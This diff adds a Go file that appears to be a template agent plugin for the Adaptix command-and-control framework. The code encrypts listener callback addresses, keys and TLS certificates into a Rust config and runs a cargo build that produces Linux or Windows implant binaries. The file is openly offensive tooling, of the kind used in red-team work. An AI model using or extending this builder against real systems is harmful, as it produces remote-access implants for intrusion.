@@ -1,0 +1,243 @@
+package main
+
+import (
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"os"
+	"strconv"
+	"strings"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
+)
+
+type GenerateConfig struct {
+	Os            string `json:"os"`
+	Arch          string `json:"arch"`
+	ReconnTimeout string `json:"reconn_timeout"`
+	ReconnCount   int    `json:"reconn_count"`
+}
+
+var SrcPath = "src___NAME__"
+
+func (p *__NAME_CAP__Plugin) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
+	var (
+		agentProfiles  [][]byte
+		generateConfig GenerateConfig
+	)
+
+	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
+		return nil, err
+	}
+
+	agentWatermark, err := strconv.ParseUint(AgentWatermark, 16, 32)
+	if err != nil {
+		return nil, err
+	}
+
+	connTimeout, err := parseGopherConnTimeout(generateConfig.ReconnTimeout)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, transportProfile := range profile.ListenerProfiles {
+		ext := &__NAME_CAP__Extender{}
+		var listenerMap map[string]any
+		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
+			return nil, err
+		}
+
+		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := hex.DecodeString(encryptKeyHex)
+		if err != nil {
+			return nil, err
+		}
+
+		addresses, err := parseGopherCallbackAddresses(listenerMap)
+		if err != nil {
+			return nil, err
+		}
+
+		useSSL, _ := listenerMap["ssl"].(bool)
+		clientCert, err := decodeOptionalGopherBase64(listenerMap, "client_cert")
+		if err != nil {
+			return nil, err
+		}
+		clientKey, err := decodeOptionalGopherBase64(listenerMap, "client_key")
+		if err != nil {
+			return nil, err
+		}
+		caCert, err := decodeOptionalGopherBase64(listenerMap, "ca_cert")
+		if err != nil {
+			return nil, err
+		}
+		banner, _ := listenerMap["tcp_banner"].(string)
+
+		profileData, err := Marshal(Profile{
+			Type:        uint(agentWatermark),
+			Addresses:   addresses,
+			BannerSize:  len(banner),
+			ConnTimeout: connTimeout,
+			ConnCount:   generateConfig.ReconnCount,
+			UseSSL:      useSSL,
+			SslCert:     clientCert,
+			SslKey:      clientKey,
+			CaCert:      caCert,
+			Sleep:       0,
+			Jitter:      0,
+			KillDate:    0,
+			WorkStart:   0,
+			WorkEnd:     0,
+		})
+		if err != nil {
+			return nil, err
+		}
+
+		encryptedProfile, err := ext.Encrypt(profileData, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileBlob := append(append([]byte{}, encryptKey...), encryptedProfile...)
+		agentProfiles = append(agentProfiles, []byte(bytesToEscapedProfile(profileBlob)))
+	}
+
+	return agentProfiles, nil
+}
+
+func parseGopherConnTimeout(raw string) (int, error) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return 10, nil
+	}
+	if secs, err := strconv.Atoi(raw); err == nil {
+		if secs > 0 {
+			return secs, nil
+		}
+		return 10, nil
+	}
+	secs, err := parseDurationToSeconds(raw)
+	if err != nil {
+		return 0, err
+	}
+	if secs <= 0 {
+		secs = 10
+	}
+	return secs, nil
+}
+
+func parseGopherCallbackAddresses(listenerMap map[string]any) ([]string, error) {
+	raw, _ := listenerMap["callback_addresses"].(string)
+	lines := strings.Split(strings.TrimSpace(raw), "\n")
+	addresses := make([]string, 0, len(lines))
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		addresses = append(addresses, line)
+	}
+	if len(addresses) == 0 {
+		return nil, fmt.Errorf("callback_addresses must contain at least one host:port entry")
+	}
+	return addresses, nil
+}
+
+func decodeOptionalGopherBase64(listenerMap map[string]any, key string) ([]byte, error) {
+	raw, _ := listenerMap[key].(string)
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil, nil
+	}
+	decoded, err := base64.StdEncoding.DecodeString(raw)
+	if err != nil {
+		return nil, fmt.Errorf("decode %s: %w", key, err)
+	}
+	return decoded, nil
+}
+
+func bytesToEscapedProfile(data []byte) string {
+	var b strings.Builder
+	b.Grow(len(data) * 4)
+	for _, v := range data {
+		_, _ = fmt.Fprintf(&b, "\\x%02x", v)
+	}
+	return b.String()
+}
+
+func (p *__NAME_CAP__Plugin) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
+	var (
+		Filename string
+		Payload  []byte
+	)
+
+	var (
+		generateConfig GenerateConfig
+		target         string
+	)
+
+	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
+	if err != nil {
+		return nil, "", err
+	}
+
+	srcDir := ModuleDir + "/" + SrcPath
+	tempDir, err := os.MkdirTemp("", "ax-*")
+	if err != nil {
+		return nil, "", err
+	}
+
+	switch generateConfig.Os + "/" + generateConfig.Arch {
+	case "linux/amd64":
+		target = "x86_64-unknown-linux-gnu"
+		Filename = "__NAME__"
+	case "linux/arm64":
+		target = "aarch64-unknown-linux-gnu"
+		Filename = "__NAME__"
+	case "windows/amd64":
+		target = "x86_64-pc-windows-gnu"
+		Filename = "__NAME__.exe"
+	default:
+		_ = os.RemoveAll(tempDir)
+		return nil, "", fmt.Errorf("unsupported target: %s/%s", generateConfig.Os, generateConfig.Arch)
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Target: %s, Output: %s", target, Filename))
+
+	config := "pub static ENC_PROFILES: &[&[u8]] = &[\n"
+	for _, p := range agentProfiles {
+		config += fmt.Sprintf("    b\"%s\",\n", p)
+	}
+	config += "];\n"
+
+	configPath := srcDir + "/src/config.rs"
+	err = os.WriteFile(configPath, []byte(config), 0644)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting cargo build...")
+
+	cmdBuild := fmt.Sprintf("__BUILD_TOOL__ --release --target %s --target-dir %s", target, tempDir)
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, srcDir, "sh", "-c", cmdBuild)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	outputPath := fmt.Sprintf("%s/%s/release/%s", tempDir, target, Filename)
+	Payload, err = os.ReadFile(outputPath)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+	_ = os.RemoveAll(tempDir)
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Payload: %s (%d bytes)", Filename, len(Payload)))
+
+	return Payload, Filename, nil
+}
